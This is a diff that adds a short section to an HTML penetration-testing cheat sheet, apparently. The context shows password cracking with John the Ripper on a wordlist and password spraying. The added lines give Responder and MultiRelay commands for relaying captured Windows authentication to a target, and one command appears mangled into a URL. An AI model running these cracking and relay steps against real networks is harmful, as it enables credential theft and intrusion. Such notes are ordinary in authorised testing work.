@@ -220,6 +220,11 @@ zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules crackme</pre></di
 
 <p>6) Run Spray (SpiderLabs/Spray)</p>
 
+<h3 id="having-trouble-getting-a-foothold-can-t-crack-ntlmv1-v2-hashes">having trouble getting a foothold?  can&rsquo;t crack ntlmv1/v2 hashes?</h3>
+
+<p>Configure Responder to redirect user auth. In responder.conf, set SMB,HTTP and HTTPS to OFF in the list of servers to start, then:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">python http://MultiRelay.py  -t &lt;TARGET_IP&gt; -u ALL 
+responder -I eth0 -v</pre></div>
   </article>
 </section>
 
